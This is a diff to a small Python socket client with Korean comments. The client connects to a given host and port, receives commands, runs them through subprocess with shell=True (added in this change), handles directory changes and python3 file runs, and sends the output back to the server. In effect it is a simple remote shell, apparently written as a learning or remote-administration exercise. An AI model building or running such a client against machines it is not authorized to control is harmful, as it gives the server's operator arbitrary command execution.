@@ -1,4 +1,4 @@
-import socket, subprocess, threading
+import socket, subprocess, threading, os
 
 def connect(h, p):
     cSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -9,17 +9,29 @@ def connect(h, p):
     cSocket.send(data)
     try:
         while True:
-            data = cSocket.recv(1024)
+            data = cSocket.recv(4096)
             msg = data.decode()
 
             print('Received : ', msg)
             if msg == 'exit':
                 break
-            data = subprocess.run(msg.split(' '), stdout=subprocess.PIPE, encoding='utf-8')
-            
-            msg = data.stdout
-            # print(msg)
-            cSocket.send(msg.encode())
+            elif msg.find('python3') == 0 : 
+                print(msg, " 파일을 실행합니다")
+                data = '파일 실행중...'
+                cSocket.send(data.encode())
+                data = subprocess.run(msg.split(' '))
+            elif msg.find('cd') == 0:
+                cd = msg.split(' ')
+                os.chdir(cd[1])
+                data = subprocess.run('pwd',shell=True, stdout=subprocess.PIPE, encoding='utf-8')
+                msg = data.stdout
+                cSocket.send(msg.encode())
+            else : # 파일 실행이 아닐 때는 그냥 전송
+                data = subprocess.run(msg.split(' '),shell=True, stdout=subprocess.PIPE, encoding='utf-8')
+                print(data)
+                msg = data.stdout
+                # print(msg)
+                cSocket.send(msg.encode())
 
     except socket.error as erm: 
         print('클라이언트가 종료되었습니다.', erm)
